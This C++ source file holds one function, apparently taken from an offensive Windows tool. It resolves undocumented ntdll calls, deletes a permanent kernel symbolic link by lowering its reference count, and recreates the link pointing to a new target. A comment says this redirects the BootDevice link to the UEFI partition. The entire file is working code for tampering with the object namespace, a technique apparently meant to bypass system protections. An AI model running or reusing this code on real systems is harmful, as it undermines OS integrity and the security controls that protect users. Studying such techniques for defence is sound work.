#include "common.h"

NTSTATUS ChangeSymlink(_In_ std::wstring symLinkName, _In_ std::wstring newDestination)
{
#pragma region loading_nt_functions
	// load NtDll and resolve the addresses of NtMakeTemporaryObject(), NtOpenSymbolicLinkObject(), and NtCreateSymbolicLinkObject()
	RAII::Hmodule ntdllModule = LoadLibraryW(L"ntdll.dll");
	if (!ntdllModule.GetHmodule())
	{
		std::cout << "[-] Couldn't open a handle to ntdll! Error: 0x" << std::hex << GetLastError() << std::endl;
		return STATUS_UNSUCCESSFUL;
	}
	pNtMakeTemporaryObject NtMakeTemporaryObject = (pNtMakeTemporaryObject)GetProcAddress(ntdllModule.GetHmodule(), "NtMakeTemporaryObject");
	if (!NtMakeTemporaryObject)
	{
		std::cout << "[-] Couldn't resolve NtMakeTemporaryObject address! Error: 0x" << std::hex << GetLastError() << std::endl;
		return STATUS_UNSUCCESSFUL;
	}
	pNtOpenSymbolicLinkObject NtOpenSymbolicLinkObject = (pNtOpenSymbolicLinkObject)GetProcAddress(ntdllModule.GetHmodule(), "NtOpenSymbolicLinkObject");
	if (!NtOpenSymbolicLinkObject)
	{
		std::cout << "[-] Couldn't resolve NtOpenSymbolicLinkObject address! Error: 0x" << std::hex << GetLastError() << std::endl;
		return STATUS_UNSUCCESSFUL;
	}
	pNtCreateSymbolicLinkObject NtCreateSymbolicLinkObject = (pNtCreateSymbolicLinkObject)GetProcAddress(ntdllModule.GetHmodule(), "NtCreateSymbolicLinkObject");
	if (!NtCreateSymbolicLinkObject)
	{
		std::cout << "[-] Couldn't resolve NtCreateSymbolicLinkObject address! Error: 0x" << std::hex << GetLastError() << std::endl;
		return STATUS_UNSUCCESSFUL;
	}
#pragma endregion native ntdll functions are loaded in this code region
#pragma region changing_symlink
	// build OBJECT_ATTRIBUTES structure to reference and then delete the permanent symbolic link to the driver path
	UNICODE_STRING symlinkPath;
	RtlInitUnicodeString(&symlinkPath, symLinkName.c_str());
	OBJECT_ATTRIBUTES symlinkObjAttr{};
	InitializeObjectAttributes(&symlinkObjAttr, &symlinkPath, OBJ_KERNEL_HANDLE, NULL, NULL);
	HANDLE symlinkHandle;

	NTSTATUS status = NtOpenSymbolicLinkObject(&symlinkHandle, DELETE, &symlinkObjAttr);
	if (status == STATUS_SUCCESS)
	{
		// NtMakeTemporaryObject is used to decrement the reference count of the symlink object
		// as those links are created with the permanent attribute (and get a fake +1 reference in the kernelspace ref counter)
		status = NtMakeTemporaryObject(symlinkHandle);
		CloseHandle(symlinkHandle);
		if (status != STATUS_SUCCESS)
		{
			std::wcout << L"[-] Couldn't delete the symbolic link " << symLinkName << L". Error:0x" << std::hex << status << std::endl;
			return status;
		}
		else std::wcout << L"[+] Successfully deleted symbolic link " << symLinkName << std::endl;
	}
	else
	{
		std::wcout << L"[-] Couldn't open a handle with DELETE privilege to the symbolic link " << symLinkName << L". Error:0x" << std::hex << status << std::endl;
		return status;
	}

	// now recreate the symbolic link to make it point to the new destintation
	UNICODE_STRING target;
	RtlInitUnicodeString(&target, newDestination.c_str());
	UNICODE_STRING newSymLinkPath;
	RtlInitUnicodeString(&newSymLinkPath, symLinkName.c_str());
	OBJECT_ATTRIBUTES newSymLinkObjAttr{};
	InitializeObjectAttributes(&newSymLinkObjAttr, &newSymLinkPath, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL); // object needs the OBJ_PERMANENT attribute or it will be deleted on exit
	HANDLE newSymLinkHandle;

	status = NtCreateSymbolicLinkObject(&newSymLinkHandle, SYMBOLIC_LINK_ALL_ACCESS, &newSymLinkObjAttr, &target);
	if (status != STATUS_SUCCESS)
	{
		std::wcout << L"[-] Couldn't create new symbolic link " << symLinkName << L" to " << newDestination << L". Error:0x" << std::hex << status << std::endl;
		return status;
	}
	else std::wcout << L"[+] Symbolic link " << symLinkName << L" to " << newDestination << L" created!" << std::endl;
	CloseHandle(newSymLinkHandle); // IMPORTANT!! If the handle is not closed it won't be possible to call this function again to restore the symlink
	return STATUS_SUCCESS;

#pragma endregion the symbolic link BootDevice is deleted and recreated to make it point to the UEFI partition
}